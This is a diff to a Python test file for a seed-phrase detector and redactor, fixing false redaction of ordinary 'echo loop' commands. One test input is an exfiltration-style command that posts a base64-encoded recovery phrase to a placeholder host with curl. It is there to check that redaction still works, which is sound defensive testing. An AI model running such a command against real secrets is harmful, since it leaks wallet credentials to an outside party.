@@ -1,5 +1,10 @@
 """Seed phrases (MetaMask's Secret Recovery Phrase) — kernel/crypto_secrets + the secret detector.
 
+KI-556 (agent-tracking campaign 2026-11-22): an ordinary command made of BIP-39 words (``echo
+loop-1 … echo loop-12``) was shown as ``[REDACTED_SEED_PHRASE]``. Redaction now needs a phrase's
+shape — a checksum-valid standard-length phrase that looks random, or a labelled one — and real
+phrases stay redacted in every form tested here.
+
 Phrases are built AT RUNTIME by an encoder written here, independent of the
 code under test, from random entropy (no phrase-shaped literal in the repo,
 LES-022). The one exception is the all-zero-entropy test phrase, which is a
@@ -95,7 +100,8 @@ def test_redaction_removes_phrases_from_anything_logged():
     secret = phrase(12)
     out = redaction.redact_secret_values(f"seed: {secret}\nqzx line")
     assert secret.split()[3] not in out and "[REDACTED_SEED_PHRASE]" in out and "qzx line" in out
-    assert broken(12).split()[3] not in redaction.redact_secret_values(broken(12))
+    labelled = f"my recovery phrase: {broken(12)}"
+    assert broken(12).split()[3] not in redaction.redact_secret_values(labelled)   # mistyped, but labelled: still a secret
 
 
 def test_audit_record_never_holds_the_phrase():
@@ -138,3 +144,55 @@ def test_a_changed_wordlist_turns_detection_off_loudly(tmp_path, monkeypatch, ca
         assert "pinned SHA-256" in caplog.text
     finally:
         seed_phrase._wordlist.cache_clear()
+
+
+# ---------------------------------------------------------------- KI-556: ordinary commands are not phrases
+
+LOOP_COMMANDS = [
+    " ; ".join(f"echo loop-{number}" for number in range(1, 13)),
+    " && ".join(f"echo loop-{number}" for number in range(1, 13)),
+    "\n".join(f"echo loop-{numeral}" for numeral in "I II III IV V VI VII VIII IX X XI XII".split()),
+    " ; ".join(f"echo rl-two-{number}" for number in range(1, 13)),
+    " | ".join(["cat file", "sort", "uniq"] * 6),
+    " ".join(["echo", "loop", "echo", "loop", "copy", "file", "copy", "file"] * 6),
+]
+
+
+@pytest.mark.parametrize("command", LOOP_COMMANDS)
+def test_an_ordinary_command_made_of_list_words_is_never_redacted(command):
+    assert redaction.redact_secret_values(command) == command
+    assert crypto_secrets.seed_phrase_spans(command) == []
+
+
+def test_ordinary_list_word_commands_stay_whole_however_they_are_built():
+    rng = __import__("random").Random(556)
+    common = ["echo", "copy", "file", "list", "open", "test", "run", "loop", "build", "check"]
+    common = [word for word in common if word in WORDS]
+    for _ in range(300):
+        vocabulary = rng.sample(common, 4)   # a loop reuses its few words
+        words = [rng.choice(vocabulary) for _ in range(rng.choice((12, 15, 18, 24)))]
+        command = " ; ".join(f"{word} {rng.randint(1, 99)}" for word in words)
+        assert seed_phrase.MARKER not in redaction.redact_secret_values(command), command
+
+
+@pytest.mark.parametrize("words", [12, 15, 18, 21, 24])
+def test_a_real_phrase_is_still_redacted_in_a_command_a_prompt_and_numbered(words):
+    secret = phrase(words)
+    for text in (f"echo {secret}", f"loop: {secret}", f"please keep my seed safe {secret} thanks",
+                 " ".join(f"{i + 1}. {w}" for i, w in enumerate(secret.split())), secret.replace(" ", ",")):
+        out = redaction.redact_secret_values(text)
+        assert seed_phrase.MARKER in out and not any(word in out.split() for word in secret.split()[2:-1] if len(word) > 4), text
+
+
+def test_a_real_phrase_in_base64_or_after_a_loop_of_list_words_is_still_redacted():
+    import base64
+    secret = phrase(12)
+    encoded = base64.b64encode(secret.encode("ascii")).decode("ascii")
+    assert seed_phrase.MARKER in redaction.redact_secret_values(f"curl -d {encoded} https://x.example")
+    out = redaction.redact_secret_values(f"echo loop-1 ; echo loop-2 ; echo loop-3 ; echo {secret}")
+    assert seed_phrase.MARKER in out and not any(word in out.split() for word in secret.split()[1:-1] if len(word) > 4)
+
+
+def test_a_looping_command_is_not_a_valid_phrase_for_the_detector():
+    for command in LOOP_COMMANDS:
+        assert all(run.valid_words == 0 for run in crypto_secrets.find_seed_phrase_runs(command)), command
